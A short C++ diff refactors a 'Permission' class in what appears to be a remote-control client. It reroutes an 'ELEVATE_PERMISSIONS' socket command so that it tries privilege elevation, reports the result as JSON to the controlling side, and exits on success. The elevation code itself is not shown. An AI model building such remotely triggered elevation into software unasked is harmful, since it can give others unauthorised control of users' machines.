@@ -32,22 +32,22 @@ BOOL Permission::elevatePermissions() {
 }
 
 void Permission::sendElevatedPermissions() {
+    nlohmann::json json;
     BOOL result = elevatePermissions();
+    json["RESPONSE"] = "PERMISSIONS";
+    json["result"] = result;
+    clientSocket.sendMessage(json.dump());
     if (result == 1) {
-        stream.sendSize(1);
         exit(0);
     }
-    stream.sendSize(result);
 }
 
-Permission::Permission(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap) : Sender(stream, actionMap) {
-    actionMap["ELEVATE"] = [&](nlohmann::json& json) {
+Permission::Permission(ClientSocket &clientSocket) : Handler(clientSocket) {
+    ActionMap& actionMap = clientSocket.getActionMap();
+    actionMap["ELEVATE_PERMISSIONS"] = [&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &Permission::sendElevatedPermissions);
     };
 
 }
 
-void Permission::send() {
-
-}
 
